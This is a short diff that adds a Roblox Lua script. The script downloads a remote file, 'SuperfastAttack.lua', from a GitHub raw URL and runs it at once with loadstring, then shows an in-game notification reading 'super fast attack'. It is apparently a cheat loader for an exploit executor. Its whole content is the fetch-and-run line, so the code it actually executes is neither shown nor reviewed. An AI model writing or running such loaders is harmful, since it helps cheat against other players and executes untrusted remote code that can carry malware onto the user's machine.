@@ -1,0 +1,8 @@
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/2I7v/script/main/SuperfastAttack.lua"))()
+
+game.StarterGui:SetCore("SendNotification", {
+      Icon = "";
+      Title = "Domadic", 
+      Text = "super fast attack"
+  })
